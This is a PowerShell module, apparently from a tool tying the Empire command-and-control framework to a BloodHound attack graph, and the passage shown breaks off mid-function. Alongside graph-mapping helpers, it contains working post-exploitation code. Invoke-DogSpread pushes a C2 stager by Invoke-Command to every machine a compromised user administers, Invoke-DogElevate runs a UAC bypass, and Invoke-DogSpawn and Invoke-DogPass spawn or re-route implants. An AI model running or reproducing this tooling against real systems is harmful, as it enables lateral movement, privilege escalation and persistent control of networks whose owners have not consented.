#################################################################################################

<#
.Synopsis
   Remove Stale Agents/Nodes
.DESCRIPTION
   Remove Stale Agents from Bloodhound
   add -Clean to also remove from Empire Server 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogWipe{
    [Alias('DogWipe')]
    Param(
        [Parameter(Mandatory=$false,Position=0,ValueFromPipeline=$True)][Alias('ID')][Int[]]$Session=$EmpireTarget.Session,
        [Parameter(Mandatory=$False)][Switch]$CleanUp
        )
    Begin{
        #Get Current Session Number/Agent
        $OldSessNum = $EmpireTarget.Session
        $OldAgent = $EmpireTarget.Agent
        }
    Process{
        Foreach($SessNum in $session){
            # Set Session
            Write-Verbose "Session $SessNum"
            try{Session $SessNum}Catch{Write-Warning "Session $SessNum not found"}

            # Get List of stale Agents from Empire Server
            $Stale = (Get-empireAgent -Stale -Id $SessNum).Name
            # If Stale Agents
            if($Stale.count -ne 0){
                Write-verbose "Found Stale Agents:`n$Stale"
                # Foreach in Stale
                $Stale | % {
                    # Delete Node
                    Write-Verbose "Removing Agent $_ from BloodHound"
                    NodeSearch -User $_ | NodeDelete -User
                    }
                # If -CleanUp
                If($CleanUp){
                    # Remove from Empire Server
                    $Null = Remove-EmpireAgent -Stale -Id $SessNum
                    Write-Verbose "Removing Stale from Empire Server"
                    }
                }
            # Else verbose
            Else{Write-Verbose "No Stale Agents Found"}
            }
        }
    End{
        # Return to old session/Agent
        Session $OldSessNum
        try{Agent $OldAgent}Catch{'Warning: Stale Target'}
        }
    }

<#
.Synopsis
   Bulk Add Properties to Nodes
.DESCRIPTION
   Bulk Add Input PS Object Properties and values to BloodHound nodes
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
function Invoke-DogFetch{
    [CmdletBinding()]
    [Alias('DogFetch')]
    Param(
        # Target node type
        [Parameter(Mandatory=$true,ParameterSetName='User')][Switch]$ToUser,
        [Parameter(Mandatory=$true,ParameterSetName='Group')][Switch]$ToGroup,
        [Parameter(Mandatory=$true,ParameterSetName='Computer')][Switch]$ToComputer
        )
    DynamicParam{
        # Select Matching Node List
        Switch($PSCmdlet.ParameterSetName){
            'User'{$NodeList=$Global:CypherDog.User}
            'Group'{$NodeList=$Global:CypherDog.Group}
            'Computer'{$NodeList=$Global:CypherDog.Computer}
            }

        ## Dictionary
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        
        ## From 
        # Create Attribute Object
        $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib1.Mandatory = $true
        $Attrib1.Position = 1
        $Attrib1.HelpMessage = "Enter Node Name"
        # Create AttributeCollection object for the attribute Object
        $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection1.Add($Attrib1)
        # Add Validate Set to attribute collection     
        $ValidateSet1=new-object System.Management.Automation.ValidateSetAttribute($NodeList)
        $Collection1.Add($ValidateSet1)
        # Create Runtime Parameter with matching attribute collection
        $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Name', [String[]], $Collection1)
		# Add Runtime Param to dictionary
		$Dictionary.Add('Name',$dynParam1)

        ## Input Object
        # Create Attribute Object
        $Attrib2 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib2.Mandatory = $True
        $Attrib2.Position = 0
        $Attrib2.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection2 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute
        $Collection2.Add($Attrib2)
        # Create Runtime Parameter with matching attribute collection
        $DynParam2 = New-Object System.Management.Automation.RuntimeDefinedParameter('InputObj', [PSCustomObject], $Collection2)
        # Add Runtime Param to dictionary
		$Dictionary.Add('InputObj',$dynParam2)
        
        ## Return Raw Object
        # Create Attribute Object
        $Attrib0 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib0.Mandatory = $false
        # Create AttributeCollection object for the attribute Object
        $Collection0 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute
        $Collection0.Add($Attrib0)
        # Create Runtime Parameter with matching attribute collection
        $DynParam0 = New-Object System.Management.Automation.RuntimeDefinedParameter('Property', [String[]], $Collection0)
        # Add Runtime Param to dictionary
		$Dictionary.Add('Property',$dynParam0)

		#return Dictionary
		return $Dictionary
        }
    Begin{}
    Process{
        foreach($Target in $DynParam1.Value){
            Write-Verbose "Updating Props on $target"
            $InputObj=$dynParam2.Value
            #test-Props
            $AllProps = ($InputObj | GM | ? Membertype -EQ NoteProperty).name -ne 'name'
            If($DynParam0.IsSet){$PropList = $DynParam0.Value}
            Else{$PropList=$AllProps}
            #Forach in PropList
            Foreach($Prop in $PropList){
                # If prop not in input object > warning
                if($Prop -notin $AllProps){Write-Warning "Property $Prop not found..."}
                # Else update node
                Else{
                    if($InputObj.$Prop){NodeUpdate -Node $target -Property $Prop -Value $InputObj.$Prop}
                    }
                }
            }
        }
    End{}
    }

<#
.Synopsis
   Map Empire Nodes in BloodHound Graph
.DESCRIPTION
   Translate Empire Infra to BloodHound Nodes and Edges
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
function Invoke-DogMap{
    [CmdletBinding()]
    [Alias('DogMap')]
    Param(
        [Parameter(Mandatory=$false)][String]$Root='root'
        )
    Begin{
        # Remember current session
        $CurrentSession = (Session ?).Session
        # If no sessions break
        if((Session *) -eq $Null){Write-Warning "No Session Found - Stoping execution"; break}
            # Clear previous empire data
            Write-Verbose "Clearing previous data..."
            $Us=@(NodeSearch -User -Property empire)
            $Gs=@(NodeSearch -Group -Property empire)
            $Cs=@(NodeSearch -Computer -Property empire)
            if($Us){$Us | NodeDelete -User}
            if($Gs){$Gs | NodeDelete -Group}
            if($Cs){$Cs | NodeDelete -Computer}
            Sync -Object Session
        # If not exist > create root node (type:user /prop: empire=root)
        if(!(NodeSearch -User -Property empire -Value root)){
            NodeCreate -User $Root
            NodeUpdate -Node $root -Property empire -Value root
            write-Verbose "Creating EmpireRoot Node - User: $root"
            NodeUpdate -Node $root -Property LastNodeUpdate -Value (Get-date).DateTime
            }
        #$Null = Node -Refresh
        try{DogBark 'Remapping Empire' -Async}catch{}
        }
    Process{
        ##SESSIONS
        #Get All Empire Sessions
        $SessionList = (Session *).id
        #for each session
        foreach($Session in $SessionList){
            #set session
            Session $Session
            Sync

            ##IF NOT EXIST >> CREATE NODE (type: Computer)
            if((NodeSearch -Computer -Property empire -Value session) -notmatch "^session_$Session$"){
                NodeCreate -Computer "session_$Session"
                NodeUpdate -Node "session_$Session" -Property empire -Value session
                }
            #$Null = Node -Refresh
            # Import Session Info
            Dogfetch -ToComputer -Name "session_$Session" -InputObj $(Get-EmpireSession -Id $Session)
            #Get-EmpireConfig  -Id $Session | DogFetch -ToComputer -Name "session_$Session"
            # Create Relationship
            EdgeCreate -UserToComputer -from (NodeSearch -User -Property empire -Value root) -to "session_$Session" -EdgeType HasControl

            ##LISTENERS
            #Get Empire Listeners
            $ListenerList = @((Get-EmpireListener).name)
            #For each Listener
            foreach($Listener in $ListenerList){
                ##IF NOT EXIST >> CREATE NODE (type: Group empire: Listener)
                if((NodeSearch -Group -Property empire -Value listener) -notmatch "^$Listener$"){
                    NodeCreate -Group $Listener
                    NodeUpdate -Node $Listener -Property empire -Value listener
                    }
                #$Null = Node -Refresh
                if($Listener){
                    #Import Listener properties
                    Get-empireListener -Name $Listener | DogFetch -ToGroup -Name $Listener
                    #Create Relationship
                    EdgeCreate -ComputerToGroup -From "session_$Session" -To $Listener -EdgeType HasListener
                    }
                ##AGENTS
                #Get Agent List
                $AgentList = (Get-empireAgent | where listener -eq $Listener).name
                #For each Agent
                if($AgentList){
                    Foreach($Agent in @($AgentList)){
                        #if((NodeSearch -User -Property empire -Value agent) -notmatch "^$Agent$")
                        NodeCreate -User $Agent
                        NodeUpdate -Node $agent -Property empire -Value agent
                        #$Null = Node -Refresh
                        #Import Agent properties
                        Get-empireAgent -Name $agent | DogFetch -ToUser -Name $agent
                        #Create Relationship from listener
                        EdgeCreate -GroupToUser -From $listener -To $Agent -EdgeType HasAgent
                        #Create RelationShip to Target
                        $target = (Node -User $agent).hostname
                        EdgeCreate -UserToComputer -From $agent -To $target -EdgeType IsAlive
                        
                        }
                    }#%Agent
                }#%Listener
            }#%Session
        }#Process       
    End{Session $CurrentSession}#End
    }

<#
.Synopsis
   Map/Update Empire Agents (loopable)
.DESCRIPTION
   Remap Empire in Bloodhound (loop)
   Note: Run in another console
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
function Invoke-DogWatch{
    [CmdletBinding(DefaultParameterSetName='OneTime')]
    [Alias('DogWatch')]
    Param(
        [Parameter(Mandatory=$false,Position=0)][int[]]$Session=$Global:EmpireTarget.Session,
        [Parameter(Mandatory=$true,ParameterSetName='Loop')][Switch]$Loop,
        [Parameter(ParameterSetName='Loop')][int]$Sleep=60
        )
    Begin{
        # List of Empire Session
        $SessList = (Get-EmpireSession).id
        # List of agents in Bloodhound
        $BHList = NodeSearch -User -Property empire -Value agent
        }
    Process{
        #If Loop
        If($Loop){
            While(1){
                Write-Verbose "$((Get-Date).DateTime)"
                Invoke-DogWatch -Session $Session
                Write-Verbose "Watchdog sleeping $Sleep seconds..."
                Start-Sleep -Seconds $Sleep
                Clear
                }
            }
        # otherwise
        Foreach($SNum in $Session){
            # If session doesnt exist
            if($SNum -notin $SessList){Write-Warning "Session $SNum not found"}
            # Else
            Else{
                Write-verbose "Updating Session $SNum"
                # Get List of agents
                $AllAgent = Get-EmpireAgent -Id $SNum
                # Create Nodes if new Agents
                ForEach($Agent in $AllAgent){
                    if($Agent.name -notin $BHList){
                        Write-Verbose "Adding Agent $($Agent.name)"
                        NodeCreate -User $Agent.name
                        }
                    }
                #Refresh Node List
                $Null = Node -Refresh
                # Create Egdes if new Agent, Update Props
                ForEach($Agent in $AllAgent){
                    If($Agent.name -notin $BHlist){
                        # Create Edges
                        NodeUpdate -Node $Agent.name -Property empire -Value agent
                        Write-Verbose "Creating Edges for $($Agent.name)" 
                        EdgeCreate -GroupToUser -From $Agent.Listener -EdgeType HasAgent -To $Agent.name
                        EdgeCreate -UserToComputer -from $Agent.name -EdgeType IsAlive -to $Agent.Hostname
                        }
                    # Update Node Properties (Agent info)
                    DogFetch -ToUser -Name $Agent.name -InputObj $Agent
                    }
                }
            }
        }
    End{Write-Verbose "Done"}
    }

<#
.Synopsis
   Spawn agent via empire module
.DESCRIPTION
   Create a Duplicate Agent on target via specified agent.
   Same Listener. Use DogPass to pass to another listener.
   Accepts multiple target & Pipeline input
   Agent must be present in Bloodhound DB
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
function Invoke-DogSpawn{
    [CmdletBinding()]
    [Alias('DogSpawn')]
    Param()
    DynamicParam{
        # List all agent nodes
        $Values = @()
        $Values += DogSearch -Agent
        $Values1 = @()
        $Values1 += DogSearch -Listener
        # Create Attribute Object for Agent
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $True
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)        
        
        # Create Attribute Object for Stager Type
        $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib1.Mandatory = $false
        $Attrib1.Position = 1
        # Create AttributeCollection object for the attribute Object
        $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection1.Add($Attrib1)
        # Add Validate Set to attribute collection
        $ValidateSet1=new-object System.Management.Automation.ValidateSetAttribute($Values1)
        $Collection1.Add($ValidateSet1)
        # Create Runtime Parameter with matching attribute collection
        $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Listener',[String],$Collection1)
        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        $Dictionary.Add('Listener',$dynParam1)
        return $Dictionary
        }
    Begin{
        #Refresh Bloodhound nodes
        $Null = Node -Refresh
        #Get Current Session Number/Agent
        $Old = $EmpireTarget
        # Set Launcher Type
        $Listener = $DynParam1.Value
        }
    Process{
        Foreach($Agent in $DynParam.Value){
            # Get Session and Listener for specified agent
            $Data = DogBite -Agent $Agent
            # Set Session
            Session $Data.Session.Split('_')[1]
            # Set Module
            Module powershell/management/spawn
            # Set Listener
            Option Listener $Listener
            # Execute
            Strike $Agent -blind 
            }
        }
    End{
        # Return to old session/Agent
        Session $Old.session
        $Null = Agent $Old.Agent
        }
    }

<#
.Synopsis
   Spread agent via WMI
.DESCRIPTION
   Spread Agent to all computer admin by user of specified agent
   Uses WMI 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogSpread{
    [CmdletBinding()]
    [Alias('DogSpread')]
    Param()
    DynamicParam{
        $Values = @()
        $Values += NodeSearch -User -Property empire -Value agent
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary
        }
    Begin{}
    Process{
        $AgentName = $dynParam.value
        ## PREP
        # Get UserName from Agent
        $AgentUsername = (get-empireagent -Name $AgentName).username.split('\')[1] 

        #List Target computers (=All Admin by User)
        $TargetNodes = edgeR -ParentOfUser $AgentUsername -Return Groups -Degree * | edgeR -AdminByGroup -Return Computers

        # Find Agent's listener
        $ListenerName = (Node -User $AgentName).listener

        # Get Stager for that listener
        $StagerStr = (stager -Type multi/launcher -Listener $ListenerName).output

        # Get Agent Session
        #get agent session
        $Addr = "http://$($Global:CypherDog.Connect.Host):$($Global:CypherDog.Connect.Port)/db/data/cypher"
        $Header=@{'Accept'='application/json; charset=UTF-8';'Content-Type'='application/json'}
        $Query = "MATCH P=ShortestPath((A:Computer)-[*1..]->(B:User {name: '$AgentName'})) RETURN A"
        $Body = "{`"query`" : `"$Query`"}"
        $Result = Try{Invoke-RestMethod -Uri $Addr -Method Post -Headers $Header -Body $Body}Catch{$Error[0].Exception}
        If($Result.data){$Result = $Result.data.data.name}
        Else{Break}
        $SessionNum = $result.split('_')[1]

        ## ATTACK
        # Set Session
        Session $SessionNum
        # Set agent
        Agent $AgentName

        # For each target Computer
        Foreach($Trgt in $TargetNodes){
    
            # Prep Command
            $Cmmnd = "Try{Invoke-Command -ComputerName $trgt -ScriptBlock {$StagerStr}}Catch{'No ICM to $trgt'}"
            # Run Command (no output)
            Command $Cmmnd -Blind
            }
        }
    End{}
    }

<#
.Synopsis
   Search Empire Nodes only
.DESCRIPTION
   Execute target listener stager on source agent 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogSearch{
    [CmdletBinding()]
    [Alias('DogSearch')]
    Param(
        [Parameter(Mandatory=$true,ParameterSetname='agent')][Switch]$Agent,
        [Parameter(Mandatory=$true,ParameterSetname='listener')][Switch]$Listener,
        [Parameter(Mandatory=$true,ParameterSetname='session')][Switch]$Session,
        [Parameter()][String]$Property,
        [Parameter()][String]$Equals,
        [Parameter()][String]$Matches
        )
    Begin{
        if($Equals -and $Matches){Write-Warning "Invalid search query - Equal or match";Break}
        if($Equals -and !$Property){Write-Warning "Invalid search query - Missing Property name";Break}
        if($Matches -and !$Property){Write-Warning "Invalid search query - Missing Property name";Break}
        Switch($PSCmdlet.ParameterSetName){
            'agent'{$NodeType = 'User'}
            'listener'{$NodeType = 'Group'}
            'session'{$NodeType = 'Computer'}
            }
        $Q = "NodeSearch -$NodeType -Property empire -Value $($PSCmdlet.ParameterSetName)"

        if($Property){$Q += "| Node -$NodeType | Where $Property"}
        if($Equals){$Q += " -eq '$Equals'"}
        if($Matches){$Q += " -match `"$Matches`""}
        }
    Process{
        $output = iex "$Q"

        }
    End{Return $Output}
    }

<#
.Synopsis
   Check Agent last checkin time
.DESCRIPTION
   Execute target listener stager on source agent 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogClock{
    [Alias('DogClock')]
    param(
        [Parameter()][Switch]$Diff,
        [Parameter()][int]$Zone
        )
    $Check = dogsearch -Agent -Property empire | select name,username,lastseen_time
    if($Diff -eq $true){
        $Collection = @()
        if($Zone){$Now = (Get-Date).AddHours($Zone).Datetime}
        else{$Now = (Get-Date).Datetime}
        foreach($obj in $Check){
            [String]$Diff = [datetime]($Obj.lastseen_time) - [datetime]$now
            $Obj | Add-Member -MemberType NoteProperty -Name Diff -Value $Diff
            $Collection += $Obj
            }
        }
    Else{$Collection = $Check}
    Return $Collection
    }

<#
.Synopsis
   Pass Agent to another Server/listener
.DESCRIPTION
   Execute target listener stager on source agent 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogPass{
    [CmdletBinding()]
    [Alias('DogPass')]
    Param()
    DynamicParam{
        # List all agent nodes
        $Values = @()
        $Values = DogSearch -Agent
        # Create Attribute Object for Agent
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $True
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)        
        
        $Values1 = dogSearch -Listener
        # Create Attribute Object for target Listener
        $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib1.Mandatory = $true
        # Create AttributeCollection object for the attribute Object
        $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection1.Add($Attrib1)
        # Add Validate Set to attribute collection
        $ValidateSet1=new-object System.Management.Automation.ValidateSetAttribute($Values1)
        $Collection1.Add($ValidateSet1)
        # Create Runtime Parameter with matching attribute collection
        $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Listener',[String],$Collection1)
        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        $Dictionary.Add('Listener',$dynParam1)
        return $Dictionary
    }
    Begin{
        $Old = $EmpireTarget
        $Listen = $DynParam1.Value
        }
    Process{
        Foreach($Agent in $DynParam.value){
            # PREP
            $AgtMap = DogBite $Agent
            $LstPath = Path -UserToGroup -From $(NodeSearch -User -Property empire -Value root) -to $Listen
            $LstSess = $LstPath[0].endnode.split('_')[1]
            # MAKE IT SO
            # Get Stager for  target listener
            Session $LstSess
            $Stager =  Stager -Type multi/launcher -Listener $Listen
            # Swap to target agent Session
            Session $AgtMap.Session.Split('_')[1]
            # Run stager on target agent
            Command -Agent $Agent -Command $Stager.Output -blind
            }
        }
    End{
        # restore old Session/Agent settings
        Session $Old.session
        Agent $Old.Agent
        }
    }

<#
.Synopsis
   Return Listener & Session for input Agent
.DESCRIPTION
   Execute target listener stager on source agent 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogBite{
    [CmdletBinding()]
    [Alias('DogBite')]
    Param()
    DynamicParam{
        #Get Agent list
        $DogList = @(DogSearch -Agent)
        $DogList += '*'
        # Create Attribute Object for Agent
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($DogList)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary

        # Create Attribute Object for Agent
        $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib1.Mandatory = $false
        # Create AttributeCollection object for the attribute Object
        $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection1.Add($Attrib1)
        # Create Runtime Parameter with matching attribute collection
        $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Select',[Switch],$Collection1)
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary

        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        $Dictionary.Add('Select',$dynParam1)
        return $Dictionary
        }
    Begin{
        If($DynParam.value -eq '*'){$DynParam.Value = DogSearch -Agent}
        $result = @()
        }
    Process{
        $FROM = NodeSearch -User -Property empire -Value root
        Foreach($Agent in $DynParam.value){
            $TO = NodeSearch -User $Agent
            $DATA = Node -User $TO
            $PATH = Path -UserToUser -From $FROM -To $TO
            $Prps = @{
                Session=$Path[0].endNode
                Listener=$Path[1].endNode
                Agent = $Agent
                High = $DATA.high_integrity
                Hostname = $DATA.hostname
                Username = $DATA.username
                } 
            $result += New-Object PSCustomObject -Property $Prps 
            }
        }
    End{
        if($DynParam1.IsSet -AND ($DynParam.Value.count -eq 1)){Session $result.Session.split('_')[1];Agent $Result.Agent}
        Else{Return $result}
        }
    }

<#
.Synopsis
   Elevate Agent with UAC bypass empire module
.DESCRIPTION
   Execute target listener stager on source agent 
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogElevate{
    [CmdletBinding()]
    [Alias('DogElevate')]
    Param()
    DynamicParam{
        #Get Agent list
        $DogList = @(DogSearch -Agent)
        # Create Attribute Object for Agent
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($DogList)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary
        }
    Begin{
        $OldTrgt = $EmpireTarget
        $OldMod = (Module ?).name
        Module 'powershell/privesc/bypassuac'
        }
    Process{
        Foreach($Agent in $DynParam.Value){
            $Agtdata = DogBite $Agent
            Session $Agtdata.session.split('_')[1]
            Option Listener $Agtdata.Listener
            Strike -Agent $Agent -Blind
            }
        }
    End{
        #return to old settings
        Session $OldTrgt.session
        try{$Null = Agent $OldTrgt.Agent}catch{}
        try{module $OldMod}catch{}
        }
    }


## DogBark
# Try add speech type if needed
try{Add-Type -AssemblyName System.speech}Catch{}

<#
.Synopsis
   Add Speech to automations
.DESCRIPTION
   Add Speech to automations (for bckgrnd tasks)
.EXAMPLE
   Example of how to use this cmdlet
.EXAMPLE
   Another example of how to use this cmdlet
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   The role this cmdlet belongs to
.FUNCTIONALITY
   The functionality that best describes this cmdlet
#>
Function Invoke-DogBark{
    [Alias('DogBark')]
    Param(
        # Message
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position=0)]
        [ValidateNotNull()][String[]]$Speech,
        # Return prompt without waiting for end of speech
        [switch]$Async,
        # Speech Volume
        [ValidateRange(0,100)][int]$Volume=100,
        # Speech Rate
        [ValidateRange(-10,10)][int]$Rate=-1    
        )
    DynamicParam{
        # Get installed voices (name only)
        $ValSet = @()
        (New-Object System.Speech.Synthesis.SpeechSynthesizer).GetInstalledVoices().voiceinfo.name | %{$ValSet += $_.split(' ')[1]}
        ## Dictionary
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        ## Dyn1
        # Create Attribute Object
        $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib1.Mandatory = $false
        $Attrib1.HelpMessage = "Select voice"
        # Create AttributeCollection object for the attribute Object
        $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection1.Add($Attrib1)
        # Add Validate Set to attribute collection     
        $ValidateSet1=new-object System.Management.Automation.ValidateSetAttribute($ValSet)
        $Collection1.Add($ValidateSet1)
        # Create Runtime Parameter with matching attribute collection
        $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Voice', [String], $Collection1)
        # Add Runtime Param to dictionary
		$Dictionary.Add('Voice',$dynParam1)
        ## Return Dictionnary
        Return $Dictionary
        }
    Begin{
        # Create speech object
        $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
        # Voice full name
        if($DynParam1.IsSet){
            $V = $DynParam1.Value
